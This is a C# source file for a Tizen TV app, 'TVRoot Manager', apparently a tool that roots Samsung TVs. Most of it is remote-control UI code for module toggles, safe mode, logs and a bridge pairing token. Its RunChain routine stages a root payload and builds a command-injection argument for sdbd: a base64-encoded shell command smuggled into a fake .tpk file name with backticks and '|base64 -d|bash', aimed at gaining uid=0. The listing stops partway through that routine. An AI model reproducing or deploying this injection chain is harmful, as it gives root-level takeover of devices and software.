using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Tizen.NUI;
using Tizen.NUI.BaseComponents;

public static class GhUIAgent
{
    private const string BuildTime = "2026-10-10T09:25Z";

    private const string Res = "/opt/usr/apps/com.samsung.tv.ghservice/res/selfroot";
    private const string AppHome = "/tmp/selfroot-app";
    private const string Pkg = "archive-root-00b0000000000001";
    private const string Staging = "/home/owner/share/tmp/sdk_tools/" + Pkg;
    private const string OnDemand = "/home/owner/share/tmp/sdk_tools/on-demand";
    private const string Evidence = "/home/owner/share/tmp/sdk_tools/selfroot-evidence";
    private const string Mark = "/tmp/selfroot";
    private const string SafeModeFile = "/opt/usr/share/selfroot/safe-mode";
    private const string ModuleRoot = "/opt/usr/share/selfroot/modules";
    private const string UiRoot = "/home/owner/share/tmp/sdk_tools/selfroot-ui";
    private const string UiModuleRoot = "/home/owner/share/tmp/sdk_tools/selfroot-ui/modules";
    private const string UiDisabledRoot = UiModuleRoot + "/disabled";
    private const string UiEnabledRoot = UiModuleRoot + "/enabled";
    private const string UiSafeMode = "/home/owner/share/tmp/sdk_tools/selfroot-ui/safe-mode";
    private const string AgentLogPath = Evidence + "/agent.log";
    private const int SessionAttempts = 18;          // 18 x 10s = 3 min for sdbd to come up
    private const string BridgeConfig = "/opt/usr/share/selfroot/bridge.conf";
    private const string BridgePortConfig = "/opt/usr/share/selfroot/bridge-port.conf";
    private const int DefaultBridgePort = 26103;
    private const int SdbPort = 26101;
    private const int BridgeTokenLength = 32;

    private static readonly object Gate = new object();
    private static readonly List<string> Events = new List<string>();
    private static double Progress = 0.0;
    private static string Banner = "TVROOT MANAGER v5.6";
    private static Color BannerColor = new Color(1f, 0.8f, 0.2f, 1f);
    private static TextLabel BannerLabel;
    private static TextLabel VersionLabel;
    private static TextLabel HintLabel;
    private static TextLabel[] Lines = new TextLabel[20];
    private static View Bar;
    private static readonly List<string> History = new List<string>();
    private static List<ModuleEntry> Modules = new List<ModuleEntry>();
    private static readonly HashSet<string> PendingToggles = new HashSet<string>();
    private static readonly string[] Pages = { "STATUS", "MODULES", "LOGS", "PAIRING" };
    private static string ModuleLoadError;
    private static string SnapshotSig = "";
    private static bool SafeToggleBusy;
    private static string BridgeStatus = "waiting for root";
    private static string UiMessage = "";
    private static DateTime UiMessageUntilUtc = DateTime.MinValue;
    private static DateTime LastUiRefreshUtc = DateTime.MinValue;
    private static int PageIndex;
    private static int SelectedModuleIndex;
    private static int DisplayLineCount;
    private static int ScrollOffset;          // v5: 0 = tail, >0 = scrolled up
    private static bool UiDirty = true;        // v5: force refresh on scroll

    private sealed class ModuleEntry
    {
        public string Id;
        public string Name;
        public string Version;
        public string Description;
        public bool Enabled;
        public string LastResult;
    }

    // v4: hold the NUI Timer in a static field. In v3.x it was a BuildUi local;
    // NUI Timer is a managed wrapper over a native handle, and with no rooted
    // reference the GC collects the wrapper mid-run and the native timer dies.
    // The UI then freezes on the last rendered frame (observed: frozen at
    // "ROOT CHAIN RUNNING" while the chain provably completed).
    private static Tizen.NUI.Timer _uiTimer;

    public static void Note(string text, double p)
    {
        lock (Gate)
        {
            Events.Add("[" + DateTime.UtcNow.ToString("HH:mm:ss") + "] " + text);
            Progress = p;
        }
    }
    public static void Note(string text) { Note(text, 0); }

    private static void AddUiEvent(string text)
    {
        lock (Gate) Events.Add("[" + DateTime.UtcNow.ToString("HH:mm:ss") + "] " + text);
        Persist(text);
    }

    // M4: best-effort persistent agent log (survives reopen; tailed on LOGS).
    private static void Persist(string text)
    {
        try
        {
            Directory.CreateDirectory(Evidence);
            File.AppendAllText(AgentLogPath,
                "[" + DateTime.UtcNow.ToString("o") + "] " + text + "\n");
        }
        catch { }
    }

    private class Agent : NUIApplication
    {
        protected override void OnCreate()
        {
            base.OnCreate();
            GhUIAgent.BuildUi();
            GhUIAgent.RunChain();
        }

        protected override void OnResume()
        {
            base.OnResume();
            lock (Gate) UiDirty = true;
        }
    }

    private static string SelfRev()
    {
        try
        {
            var path = typeof(GhUIAgent).Assembly.Location;
            using (var sha = SHA256.Create())
            using (var stream = File.OpenRead(path))
            {
                var hash = sha.ComputeHash(stream);
                var sb = new StringBuilder();
                for (int i = 0; i < 6; i++) sb.Append(hash[i].ToString("x2"));
                return sb.ToString();
            }
        }
        catch (Exception e) { return "rev-err:" + e.GetType().Name; }
    }

    public static void BuildUi()
    {
        var w = Window.Instance;
        w.BackgroundColor = new Color(0f, 0f, 0f, 1f);
        w.Title = "TVRoot Manager v5.6";

        BannerLabel = new TextLabel
        {
            Text = Banner,
            PointSize = 40,
            TextColor = BannerColor,
            Position2D = new Position2D(120, 80),
            Size2D = new Size2D(1680, 56),
        };
        w.Add(BannerLabel);

        VersionLabel = new TextLabel
        {
            Text = "v5.6 build " + BuildTime + " rev " + SelfRev(),
            PointSize = 15,
            TextColor = new Color(0.45f, 0.45f, 0.5f, 1f),
            Position2D = new Position2D(120, 142),
            Size2D = new Size2D(1680, 26),
        };
        w.Add(VersionLabel);

        var hint = new TextLabel
        {
            Text = "Left/Right: pages | Up/Down: select or scroll | OK: toggle | Back: close",
            PointSize = 16,
            TextColor = new Color(0.6f, 0.6f, 0.6f, 1f),
            Position2D = new Position2D(120, 176),
            Size2D = new Size2D(1680, 28),
        };
        w.Add(hint);
        HintLabel = hint;

        var bgBar = new View
        {
            BackgroundColor = new Color(0.15f, 0.15f, 0.15f, 1f),
            Position2D = new Position2D(120, 218),
            Size2D = new Size2D(1680, 22),
        };
        w.Add(bgBar);

        Bar = new View
        {
            BackgroundColor = new Color(0.2f, 0.9f, 0.3f, 1f),
            Position2D = new Position2D(120, 218),
            Size2D = new Size2D(0, 22),
        };
        w.Add(Bar);

        for (int i = 0; i < Lines.Length; i++)
        {
            Lines[i] = new TextLabel
            {
                Text = "",
                PointSize = 18,
                TextColor = new Color(0.9f, 0.9f, 0.9f, 1f),
                Position2D = new Position2D(120, 264 + i * 34),
                Size2D = new Size2D(1680, 32),
            };
            w.Add(Lines[i]);
        }

        w.KeyEvent += OnUiKey;

        _uiTimer = new Tizen.NUI.Timer(300);
        _uiTimer.Tick += OnTick;
        _uiTimer.Start();
    }

    private static void OnUiKey(object sender, Window.KeyEventArgs e)
    {
        var name = e.Key != null ? e.Key.KeyPressedName : null;
        if (string.IsNullOrEmpty(name)) return;
        // M4: one remote press delivers down+up; acting on both jumped two
        // pages (or toggled twice) per press. Ignore the release phase.
        // Deliberately only filters "up" so an unknown vocabulary can't
        // brick the UI; held-key auto-repeat (repeated downs) still works.
        try
        {
            if (e.Key.State == Tizen.NUI.Key.StateType.Up) return;
        }
        catch { }
        ModuleEntry moduleToToggle = null;
        bool safeToggle = false;
        lock (Gate)
        {
            if (name == "Left")
            {
                PageIndex = (PageIndex + Pages.Length - 1) % Pages.Length;
                ScrollOffset = 0;
                UiDirty = true;
            }
            else if (name == "Right")
            {
                PageIndex = (PageIndex + 1) % Pages.Length;
                ScrollOffset = 0;
                UiDirty = true;
            }
            else if (name == "Up" && PageIndex == 1 && Modules.Count > 0)
            {
                SelectedModuleIndex = System.Math.Max(0, SelectedModuleIndex - 1);
                UiDirty = true;
            }
            else if (name == "Down" && PageIndex == 1 && Modules.Count > 0)
            {
                SelectedModuleIndex = System.Math.Min(Modules.Count - 1, SelectedModuleIndex + 1);
                UiDirty = true;
            }
            else if (name == "Up" && PageIndex == 2)
            {
                ScrollOffset = System.Math.Min(ScrollOffset + 1,
                    System.Math.Max(0, DisplayLineCount - Lines.Length));
                UiDirty = true;
            }
            else if (name == "Down" && PageIndex == 2)
            {
                ScrollOffset = System.Math.Max(0, ScrollOffset - 1);
                UiDirty = true;
            }
            else if (name == "Return" && PageIndex == 1
                && SelectedModuleIndex >= 0 && SelectedModuleIndex < Modules.Count)
            {
                moduleToToggle = Modules[SelectedModuleIndex];
            }
            else if (name == "Return" && PageIndex == 0)
            {
                PageIndex = 1;
                UiDirty = true;
            }
            else if (name == "Up" && PageIndex == 0)
            {
                safeToggle = true;   // STATUS: couch safe-mode toggle (next boot)
            }
            else if (name == "Back" || name == "Exit" || name == "Escape"
                || name == "XF86Back")
            {
                CloseRequested = true;
            }
        }
        if (moduleToToggle != null) ToggleModule(moduleToToggle);
        if (safeToggle) ToggleSafeMode();
    }

    private static bool CloseRequested;

    private static void RequestExit()
    {
        try
        {
            var app = Tizen.Applications.Application.Current as NUIApplication;
            if (app != null) app.Exit();
        }
        catch { }
    }

    private static bool OnTick(object sender, Tizen.NUI.Timer.TickEventArgs e)
    {
        RefreshModuleSnapshot();
        List<string> pending = null;
        List<string> history;
        List<ModuleEntry> modules;
        double progress;
        string banner;
        Color bannerColor;
        bool dirty;
        int scroll;
        int page;
        int selected;
        string moduleLoadError;
        string bridgeStatus;
        string uiMessage;
        DateTime uiMessageUntil;
        lock (Gate)
        {
            if (Events.Count > 0)
            {
                pending = new List<string>(Events);
                Events.Clear();
                History.AddRange(pending);
                if (History.Count > 400) History.RemoveRange(0, History.Count - 400);
            }
            progress = Progress;
            banner = Banner;
            bannerColor = BannerColor;
            dirty = UiDirty || pending != null;
            scroll = ScrollOffset;
            page = PageIndex;
            selected = SelectedModuleIndex;
            modules = new List<ModuleEntry>(Modules);
            history = new List<string>(History);
            moduleLoadError = ModuleLoadError;
            bridgeStatus = BridgeStatus;
            uiMessage = UiMessage;
            uiMessageUntil = UiMessageUntilUtc;
            UiDirty = false;
        }
        // M4: transient confirmations live 5s, then are consumed so the UI
        // falls back (module description) with a single repaint, not a loop.
        if (!string.IsNullOrEmpty(uiMessage) && DateTime.UtcNow >= uiMessageUntil)
        {
            lock (Gate) { UiMessage = ""; UiDirty = true; }
            uiMessage = "";
            dirty = true;
        }
        if (dirty)
        {
            var pageLines = BuildPageLines(
                page, banner, modules, history, selected, moduleLoadError, bridgeStatus, uiMessage, uiMessageUntil);
            int start = page == 1
                ? ModulePageStart(modules.Count, selected)
                : System.Math.Max(0, pageLines.Count - Lines.Length - scroll);
            lock (Gate) DisplayLineCount = pageLines.Count;
            for (int i = 0; i < Lines.Length; i++)
            {
                int idx = start + i;
                Lines[i].Text = idx < pageLines.Count ? pageLines[idx] : "";
            }
            HintLabel.Text = BuildHint(page, scroll);
        }
        if (BannerLabel.Text != banner) BannerLabel.Text = banner;
        if (bannerColor != BannerLabel.TextColor) BannerLabel.TextColor = bannerColor;
        var width = (int)(1680 * progress);
        Bar.Size2D = new Size2D(width, 22);
        if (CloseRequested)
        {
            RequestExit();
            return false;
        }
        return true;
    }

    private static string BuildHint(int page, int scroll)
    {
        if (page == 1) return Pages[page] + " | Left/Right: pages | Up/Down: choose | OK: toggle for next boot | Back: close";
        if (page == 2) return Pages[page] + " | Left/Right: pages | Up/Down: scroll | Back: close";
        if (scroll > 0) return Pages[page] + " | Left/Right: pages | Down: newer | Back: close";
        return Pages[page] + " | Up: safe-mode | OK: modules | Left/Right: pages | Back: close";
    }

    private static void RefreshModuleSnapshot()
    {
        if ((DateTime.UtcNow - LastUiRefreshUtc).TotalSeconds < 1.0) return;
        LastUiRefreshUtc = DateTime.UtcNow;
        List<ModuleEntry> modules;
        string error = null;
        try
        {
            modules = LoadModules();
        }
        catch (Exception exception)
        {
            modules = new List<ModuleEntry>();
            error = exception.GetType().Name + ": " + exception.Message;
        }
        var sig = new StringBuilder();
        sig.Append(error).Append('|');
        foreach (var module in modules)
            sig.Append(module.Id).Append(module.Enabled ? '1' : '0').Append(module.LastResult).Append(';');
        lock (Gate)
        {
            Modules = modules;
            ModuleLoadError = error;
            // M4: only repaint when the snapshot actually changed (was: every
            // second, churning all 20 labels and causing visible flicker).
            if (SnapshotSig != sig.ToString()) { SnapshotSig = sig.ToString(); UiDirty = true; }
            if (SelectedModuleIndex >= Modules.Count) SelectedModuleIndex = System.Math.Max(0, Modules.Count - 1);
        }
    }

    private static List<ModuleEntry> LoadModules()
    {
        var modules = new List<ModuleEntry>();
        if (!Directory.Exists(ModuleRoot)) return modules;
        var moduleLog = ReadTailLines(Evidence + "/modules.log", 1000);
        foreach (var directory in Directory.GetDirectories(ModuleRoot))
        {
            var id = System.IO.Path.GetFileName(directory);
            if (!Regex.IsMatch(id, "^[a-zA-Z0-9][a-zA-Z0-9._-]*$")) continue;
            if (!File.Exists(System.IO.Path.Combine(directory, "boot.sh"))) continue;
            var metadataPath = System.IO.Path.Combine(directory, "module.json");
            var metadata = File.Exists(metadataPath) ? File.ReadAllText(metadataPath) : "";
            var baseDisabled = MarkerPresent(System.IO.Path.Combine(directory, "disabled"));
            var uiDisabled = MarkerPresent(System.IO.Path.Combine(UiDisabledRoot, id));
            var uiEnabled = MarkerPresent(System.IO.Path.Combine(UiEnabledRoot, id));
            modules.Add(new ModuleEntry
            {
                Id = id,
                Name = JsonString(metadata, "name", id),
                Version = JsonString(metadata, "version", "?"),
                Description = JsonString(metadata, "description", ""),
                Enabled = !uiDisabled && (uiEnabled || !baseDisabled),
                LastResult = LastModuleResult(moduleLog, id),
            });
        }
        modules.Sort((left, right) => string.Compare(left.Name, right.Name, StringComparison.OrdinalIgnoreCase));
        return modules;
    }

    // M4: empty marker files count as absent. Root pre-creates all markers
    // (the app cannot create files here) and the toggle only ever
    // overwrites/truncates, so empty == no override from anyone.
    private static bool MarkerPresent(string path)
    {
        try { return File.Exists(path) && new FileInfo(path).Length > 0; }
        catch { return false; }
    }

    private static string JsonString(string json, string key, string fallback)
    {
        var pattern = "\"" + Regex.Escape(key) + "\"\\s*:\\s*\"((?:\\\\.|[^\"\\\\])*)\"";
        var match = Regex.Match(json, pattern);
        if (!match.Success) return fallback;
        return match.Groups[1].Value.Replace("\\\"", "\"").Replace("\\\\", "\\");
    }

    private static string LastModuleResult(List<string> lines, string id)
    {
        for (int i = lines.Count - 1; i >= 0; i--)
        {
            var exitMarker = " " + id + " exit=";
            var exitIndex = lines[i].IndexOf(exitMarker, StringComparison.Ordinal);
            if (exitIndex >= 0) return "exit=" + lines[i].Substring(exitIndex + exitMarker.Length).Trim();
            if (lines[i].IndexOf(" skip " + id + " (disabled)", StringComparison.Ordinal) >= 0) return "skipped";
        }
        return "no run yet";
    }

    private static void ToggleModule(ModuleEntry module)
    {
        bool enabled = !module.Enabled;
        lock (Gate)
        {
            if (!PendingToggles.Add(module.Id)) return;
        }
        Task.Run(() =>
        {
            try
            {
                Directory.CreateDirectory(UiDisabledRoot);
                Directory.CreateDirectory(UiEnabledRoot);
                var disabledPath = System.IO.Path.Combine(UiDisabledRoot, module.Id);
                var enabledPath = System.IO.Path.Combine(UiEnabledRoot, module.Id);
                if (enabled)
                {
                    File.WriteAllText(enabledPath, DateTime.UtcNow.ToString("o"));
                    ClearMarker(disabledPath);
                }
                else
                {
                    File.WriteAllText(disabledPath, DateTime.UtcNow.ToString("o"));
                    ClearMarker(enabledPath);
                }
                lock (Gate)
                {
                    UiMessage = module.Name + " " + (enabled ? "enabled" : "disabled") + " for next boot";
                    UiMessageUntilUtc = DateTime.UtcNow.AddSeconds(5);
                }
                AddUiEvent("module " + module.Id + " set " + (enabled ? "enabled" : "disabled") + " for next boot");
            }
            catch (Exception error)
            {
                lock (Gate)
                {
                    UiMessage = "Toggle failed: " + error.GetType().Name;
                    UiMessageUntilUtc = DateTime.UtcNow.AddSeconds(5);
                }
                AddUiEvent("module toggle failed: " + error.GetType().Name);
            }
            finally
            {
                lock (Gate)
                {
                    PendingToggles.Remove(module.Id);
                    UiDirty = true;
                }
            }
        });
    }

    // M4: couch safe-mode toggle (STATUS page, Up). Writes a marker in the
    // app-writable UI dir; RunChain honors it like the flag file, next boot.
    // Recovery without the manager: sdb shell rm <marker> (dir is 777), or
    // delete it over the bridge from the desktop.
    private static void ToggleSafeMode()
    {
        lock (Gate)
        {
            if (SafeToggleBusy) return;
            SafeToggleBusy = true;
        }
        Task.Run(() =>
        {
            try
            {
                Directory.CreateDirectory(UiRoot);
                bool on;
                if (File.Exists(UiSafeMode)) { File.Delete(UiSafeMode); on = false; }
                else { File.WriteAllText(UiSafeMode, DateTime.UtcNow.ToString("o")); on = true; }
                var msg = on
                    ? "safe mode ON for next boot (toggle again, or rm selfroot-ui/safe-mode, to undo)"
                    : "safe mode off for next boot";
                lock (Gate) { UiMessage = msg; UiMessageUntilUtc = DateTime.UtcNow.AddSeconds(5); }
                AddUiEvent(msg);
            }
            catch (Exception error)
            {
                lock (Gate)
                {
                    UiMessage = "Safe-mode toggle failed: " + error.GetType().Name;
                    UiMessageUntilUtc = DateTime.UtcNow.AddSeconds(5);
                }
                AddUiEvent("safe-mode toggle failed: " + error.GetType().Name);
            }
            finally { lock (Gate) { SafeToggleBusy = false; UiDirty = true; } }
        });
    }

    // M4: delete, but fall back to truncating to empty (== absent). The app
    // may lack delete rights where it has overwrite rights; either way the
    // opposite side must not keep a live marker.
    private static void ClearMarker(string path)
    {
        try
        {
            if (File.Exists(path)) File.Delete(path);
            return;
        }
        catch { }
        try { File.WriteAllText(path, ""); } catch { }
    }

    private static List<string> BuildPageLines(
        int page,
        string banner,
        List<ModuleEntry> modules,
        List<string> history,
        int selected,
        string moduleLoadError,
        string bridgeStatus,
        string uiMessage,
        DateTime uiMessageUntil)
    {
        var lines = new List<string>();
        bool transientLive = !string.IsNullOrEmpty(uiMessage) && DateTime.UtcNow < uiMessageUntil;
        if (page == 0)
        {
            int enabledCount = 0;
            foreach (var module in modules) if (module.Enabled) enabledCount++;
            lines.Add("ROOT STATUS: " + banner);
            lines.Add("Last proof: " + LastProofTime());
            lines.Add("SDB bridge: " + bridgeStatus + " (port " + BridgePort() + ")");
            lines.Add("Bridge token hint: " + BridgeTokenHint());
            lines.Add("Safe mode: " + SafeModeText() + "  (Up toggles, next boot)");
            lines.Add("Modules: " + enabledCount + "/" + modules.Count + " enabled; changes apply next boot");
            if (!string.IsNullOrEmpty(moduleLoadError)) lines.Add("Module scan: " + moduleLoadError);
            if (transientLive) lines.Add(uiMessage);
            lines.Add("");
            lines.Add("Use Left/Right to open MODULES, LOGS, or PAIRING.");
        }
        else if (page == 1)
        {
            lines.Add("MODULES  |  OK toggles the selected module for the next boot");
            if (!string.IsNullOrEmpty(moduleLoadError)) lines.Add("Module scan failed: " + moduleLoadError);
            else if (modules.Count == 0) lines.Add("No module directories found.");
            for (int i = 0; i < modules.Count; i++)
            {
                var module = modules[i];
                lines.Add((i == selected ? "> " : "  ") + (module.Enabled ? "ON  " : "OFF ")
                    + module.Name + " v" + module.Version + " | " + module.LastResult);
            }
            // Detail line: a fresh toggle confirmation for 5s, otherwise the
            // selected module's description (word-wrapped, dimmed by prefix).
            if (transientLive) lines.Add(uiMessage);
            else if (selected >= 0 && selected < modules.Count
                && !string.IsNullOrEmpty(modules[selected].Description))
            {
                foreach (var wrapped in WrapText("..." + modules[selected].Description, 80))
                    lines.Add(wrapped);
            }
            lines.Add("");
            lines.Add("Changes are saved now and take effect after reboot.");
        }
        else if (page == 2)
        {
            lines.Add("MODULE RUNNER (latest entries)");
            AppendFileTail(lines, Evidence + "/modules.log", "modules.log", 18);
            foreach (var module in modules)
            {
                var path = Evidence + "/module-" + module.Id + ".log";
                if (!File.Exists(path)) continue;
                lines.Add("[" + module.Id + "]");
                AppendTail(lines, path, 3);
            }
            lines.Add("[bridge.log]");
            AppendTail(lines, Evidence + "/bridge.log", 8);
            lines.Add("[agent.log - persistent]");
            var agentTail = ReadTailLines(AgentLogPath, 25);
            if (agentTail.Count == 0) lines.Add("(empty)");
            else lines.AddRange(agentTail);
            lines.Add("[this session - latest]");
            if (history.Count == 0) lines.Add("(no events yet)");
            else for (int i = System.Math.Max(0, history.Count - 15); i < history.Count; i++) lines.Add(history[i]);
        }
        else
        {
            var token = BridgeToken();
            var host = LocalIpv4();
            lines.Add("PAIR THIS TV WITH THE DESKTOP MANAGER");
            lines.Add("TV address: " + host);
            lines.Add("Bridge port: " + BridgePort());
            lines.Add("Pairing token: " + (token.Length == 0 ? "not configured" : token));
            lines.Add("Pairing URI:");
            lines.Add("tvroot://" + host + ":" + BridgePort() + "/" + token);
            lines.Add("");
            lines.Add("This bearer token grants SDB access; keep it private.");
        }
        return lines;
    }

    // M4: word-wrap for the module description detail line (labels are
    // single-line; long text would clip).
    private static List<string> WrapText(string text, int width)
    {
        var outLines = new List<string>();
        foreach (var paragraph in text.Split('\n'))
        {
            var words = paragraph.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
            var current = new StringBuilder();
            foreach (var word in words)
            {
                if (current.Length > 0 && current.Length + 1 + word.Length > width)
                {
                    outLines.Add(current.ToString());
                    current.Length = 0;
                }
                if (current.Length > 0) current.Append(' ');
                current.Append(word);
            }
            outLines.Add(current.ToString());
        }
        return outLines;
    }

    private static int ModulePageStart(int count, int selected)
    {
        int visibleRows = System.Math.Max(1, Lines.Length - 4);
        return System.Math.Max(0, System.Math.Min(selected - visibleRows + 1, count - visibleRows));
    }

    private static void AppendFileTail(List<string> output, string path, string heading, int count)
    {
        output.Add("[" + heading + "]");
        AppendTail(output, path, count);
    }

    private static void AppendTail(List<string> output, string path, int count)
    {
        foreach (var line in ReadTailLines(path, count)) output.Add(line);
    }

    private static List<string> ReadTailLines(string path, int count)
    {
        var tail = new Queue<string>();
        try
        {
            using (var reader = new StreamReader(path))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    if (tail.Count == count) tail.Dequeue();
                    tail.Enqueue(line);
                }
            }
        }
        catch { }
        return new List<string>(tail);
    }

    private static string SafeModeText()
    {
        bool flag = false, ui = false;
        try { flag = File.Exists(SafeModeFile); } catch { }
        try { ui = File.Exists(UiSafeMode); } catch { }
        if (flag && ui) return "ON (flag file + couch)";
        if (flag) return "ON (flag file)";
        if (ui) return "ON (couch override)";
        return "off";
    }

    private static int BridgePort()
    {
        try
        {
            int port;
            return File.Exists(BridgePortConfig)
                && int.TryParse(File.ReadAllText(BridgePortConfig).Trim(), out port)
                ? port : DefaultBridgePort;
        }
        catch { return DefaultBridgePort; }
    }

    private static string BridgeToken()
    {
        try { return File.ReadAllText(BridgeConfig).Trim(); }
        catch { return ""; }
    }

    private static string BridgeTokenHint()
    {
        var token = BridgeToken();
        return token.Length >= 6 ? "******" + token.Substring(token.Length - 6) : "not configured";
    }

    private static string LastProofTime()
    {
        try
        {
            var path = Evidence + "/selfroot-proof.txt";
            return File.Exists(path) ? File.GetLastWriteTime(path).ToString("yyyy-MM-dd HH:mm:ss") : "not recorded";
        }
        catch { return "unavailable"; }
    }

    private static string LocalIpv4()
    {
        try
        {
            using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
            {
                socket.Connect(IPAddress.Parse("192.0.2.1"), 9);
                return ((IPEndPoint)socket.LocalEndPoint).Address.ToString();
            }
        }
        catch { return "unknown"; }
    }

    private static DateTime BootTimeUtc()
    {
        try
        {
            foreach (var line in File.ReadAllLines("/proc/stat"))
            {
                if (!line.StartsWith("btime ", StringComparison.Ordinal)) continue;
                long seconds;
                if (long.TryParse(line.Substring(6).Trim(), out seconds))
                    return new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(seconds);
            }
        }
        catch { }
        return DateTime.MinValue;
    }

    // M4: true when this boot already rooted (proof newer than boot time).
    private static bool FreshProofThisBoot(out string proofText)
    {
        proofText = null;
        try
        {
            var path = Evidence + "/selfroot-proof.txt";
            if (!File.Exists(path)) return false;
            var boot = BootTimeUtc();
            if (boot != DateTime.MinValue && File.GetLastWriteTimeUtc(path) < boot) return false;
            var text = File.ReadAllText(path);
            if (text.IndexOf("SELFROOT-PROOF uid=0", StringComparison.Ordinal) < 0) return false;
            proofText = text;
            return true;
        }
        catch { return false; }
    }

    public static void RunChain()
    {
        Task.Run(() =>
        {
            var bootStarted = DateTime.UtcNow;
            try
            {
                Directory.CreateDirectory(Mark);
                Directory.CreateDirectory(AppHome);

                var status = new StringBuilder();
                foreach (var line in File.ReadAllLines("/proc/self/status"))
                {
                    if (line.StartsWith("Name:", StringComparison.Ordinal)
                        || line.StartsWith("Uid:", StringComparison.Ordinal)
                        || line.StartsWith("Cap", StringComparison.Ordinal))
                    {
                        status.Append(line.Trim()).Append(' ');
                    }
                }
                try
                {
                    status.Append("label=")
                        .Append(File.ReadAllText("/proc/self/attr/current").Trim()).Append(' ');
                }
                catch { }
                Note("manager v5.6 boot - " + status, 0.02);

                foreach (var name in new[]
                {
                    "SamsungTvArchiveRoot.dll",
                    "SamsungTvArchiveRoot.runtimeconfig.json",
                    "public.pem",
                    "passwd",
                    Pkg + ".tar.gz",
                    Pkg + ".tar.gz.signature",
                })
                {
                    File.Copy(System.IO.Path.Combine(Res, name), System.IO.Path.Combine(AppHome, name), true);
                }
                Note("staged chain artifacts -> " + AppHome, 0.05);

                var outer = new StringBuilder()
                    .Append("#!/bin/sh\n")
                    .Append("EV=").Append(Evidence).Append("\n")
                    .Append("mkdir -p \"$EV\" 2>/dev/null\n")
                    .Append("chmod 0777 \"$EV\" 2>/dev/null\n")
                    .Append("chsmack -a _ \"$EV\" 2>/dev/null\n")
                    .Append("{\n")
                    .Append("  date\n")
                    .Append("  id\n")
                    .Append("  cat /proc/self/attr/current\n")
                    .Append("  cp ").Append(AppHome).Append("/SamsungTvArchiveRoot.dll ")
                        .Append(AppHome).Append("/SamsungTvArchiveRoot.runtimeconfig.json ")
                        .Append(AppHome).Append("/public.pem ")
                        .Append(AppHome).Append("/passwd ").Append(Staging).Append("/\n")
                    .Append("  cp ").Append(AppHome).Append("/").Append(Pkg).Append(".tar.gz ")
                        .Append(AppHome).Append("/").Append(Pkg).Append(".tar.gz.signature ")
                        .Append(OnDemand).Append("/\n")
                    .Append("  /usr/bin/dotnet ").Append(Staging)
                        .Append("/SamsungTvArchiveRoot.dll ").Append(Pkg)
                        .Append(' ').Append(Staging).Append(' ').Append(OnDemand).Append('\n')
                    .Append("  echo payload-exit=$?\n")
                    .Append("  sleep 3\n")
                    .Append("  cp /tmp/selfroot-proof.txt \"$EV/selfroot-proof.txt\" 2>/dev/null\n")
                    .Append("  cp /tmp/archive-root-").Append(Pkg).Append(".log \"$EV/payload.log\" 2>/dev/null\n")
                    .Append("  cp ").Append(Mark).Append("/sdb-client.log \"$EV/sdb-client.log\" 2>/dev/null\n")
                    .Append("  echo \"--- evidence ---\"\n")
                    .Append("  ls -la \"$EV\"\n")
                    .Append("} > \"$EV/outer.log\" 2>&1\n")
                    .Append("chsmack -a _ \"$EV\"/* 2>/dev/null\n");
                File.WriteAllText(AppHome + "/selfroot-launch.sh", outer.ToString());
                Note("outer script staged (cat|bash, UEP-safe)", 0.08);

                var token = "app" + ((uint)Environment.TickCount).ToString("x8");
                var wrapped = "/bin/mkdir /tmp/s-" + token + " 2>/dev/null&&{ cat "
                    + AppHome + "/selfroot-launch.sh|bash;}";
                var encoded = Convert.ToBase64String(Encoding.ASCII.GetBytes(wrapped));
                var argument = "0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}"
                    + encoded + "|base64${IFS}-d|bash`.tpk";
                Note("injection armed (" + argument.Length + "/510 bytes)", 0.10);
                if (argument.Length > 510) throw new Exception("injection too big");

                lock (Gate)
                {
                    Banner = "WAITING FOR SDBD (127.0.0.1)";
                    BannerColor = new Color(1f, 0.8f, 0.2f, 1f);
                }

                // M4: reopen fast-path — this boot already rooted (fresh
                // proof newer than boot): skip the injection, go green,
                // restart the bridge. This is what makes the manager
                // re-openable as an app instead of a boot-only splash.
                string existingProof;
                if (FreshProofThisBoot(out existingProof))
                {
                    Note("this boot already rooted - chain skipped (fast-path)", 1.0);
                    Persist("fast-path: fresh proof from this boot, chain skipped");
                    try { Note("PROOF:\n" + existingProof, 1.0); } catch { }
                    lock (Gate)
                    {
                        Banner = "ROOT ACQUIRED - UNTETHERED";
                        BannerColor = new Color(0.2f, 1f, 0.3f, 1f);
                        Progress = 1.0;
                    }
                    StartBridge();
                    return;
                }

                // v4: safe mode — flag file (or the couch override from the
                // STATUS page) skips the chain and the bridge, next boot.
                bool uiSafe = false;
                try { uiSafe = File.Exists(UiSafeMode); } catch { }
                if (File.Exists(SafeModeFile) || uiSafe)
                {
                    var safeMsg = "safe-mode present ("
                        + (uiSafe ? "couch override" : SafeModeFile)
                        + "): chain skipped";
                    Note(safeMsg, 0.0);
                    Persist(safeMsg);
                    lock (Gate)
                    {
                        Banner = "SAFE MODE - CHAIN SKIPPED";
                        BannerColor = new Color(1f, 0.6f, 0.2f, 1f);
                        BridgeStatus = "not started (safe mode)";
                    }
                    return;
                }

                lock (Gate)
                {
                    Banner = "WAITING FOR SDBD (127.0.0.1)";
                    BannerColor = new Color(1f, 0.8f, 0.2f, 1f);
                }

                // v4: single-shot chain. sdbd caches the dev host IP at startup
                // (live flips do nothing), so retrying past its boot window is
                // pointless — park with a clear status instead of polling forever.
                Socket s = null;
                int attempt = 0;
                while (attempt < SessionAttempts)
                {
                    attempt++;
                    lock (Gate) { Progress = 0.12; }
                    if (attempt == 1 || attempt % 6 == 0)
                    {
                        Note("sdbd wait " + attempt + "/" + SessionAttempts
                            + " (dev IP must be 127.0.0.1)", 0.12);
                    }
                    if (TrySession(out s)) break;
                    Thread.Sleep(10000);
                }
                if (s == null)
                {
                    Note("no sdbd session in " + SessionAttempts + " attempts", 0.12);
                    lock (Gate)
                    {
                        Banner = "SKIPPED - DEV IP NOT 127.0.0.1?";
                        BannerColor = new Color(0.9f, 0.3f, 0.2f, 1f);
                        BridgeStatus = "not started (no sdb session)";
                    }
                    return;
                }

                lock (Gate)
                {
                    Banner = "SDBD SESSION OPEN";
                    BannerColor = new Color(0.4f, 0.8f, 1f, 1f);
